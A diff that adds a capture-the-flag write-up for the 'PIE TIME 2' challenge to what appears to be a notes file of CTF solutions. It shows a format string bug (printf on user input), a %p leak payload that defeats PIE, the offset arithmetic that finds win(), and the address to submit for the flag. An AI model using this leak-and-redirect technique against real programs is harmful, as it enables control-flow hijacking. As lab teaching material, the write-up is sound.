@@ -331,4 +331,54 @@ Server responds with a token:
 5. look for suspicious .txt file
 6. cat that file and get the flag
 
+---
 
+### ID 491 — PIE TIME 2
+
+## Approach:
+1. Identify the vulnerability
+Inside the source:
+```
+printf(buffer);   // format string vulnerability
+---> Why? Because user input is passed as the format string, allowing us to read stack values via %p.
+```
+
+2. The binary has PIE enabled. That means that absolute addresses change every execution.
+But relative offsets between functions remain constant.
+```
+Locally:
+main - win = 0x96
+So:
+win = main - 0x96
+This offset never changes.
+```
+
+4. Leak a runtime address
+When the program asks for your name:
+```
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+```
+The last printed address is always the current PIE-shifted address of main().
+```
+Example leak:
+...0x1000000000x58d9f1cb3400
+So:
+main() = 0x58d9f1cb3400
+```
+
+4. Compute the address of win()
+Using the constant offset:
+```
+win = main - 0x96
+win = 0x58d9f1cb3400 - 0x96
+win = 0x58d9f1cb336a
+```
+
+5.Trigger the jump
+The program asks:
+enter the address to jump to: (...)
+You provide the computed address:
+```
+0x58d9f1cb336a
+```
+Then you get the flag.
